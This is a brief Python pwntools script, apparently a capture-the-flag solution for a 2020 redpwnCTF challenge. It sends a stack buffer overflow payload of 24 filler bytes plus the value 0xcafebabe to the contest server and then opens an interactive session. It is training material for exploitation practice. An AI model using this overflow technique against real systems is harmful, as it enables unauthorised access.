from pwn import *

payload = 'A'*24+p32(0xcafebabe)

p = remote('2020.redpwnc.tf', 31255)
print p.recv()
print p.recv()
p.sendline(payload)
p.interactive()
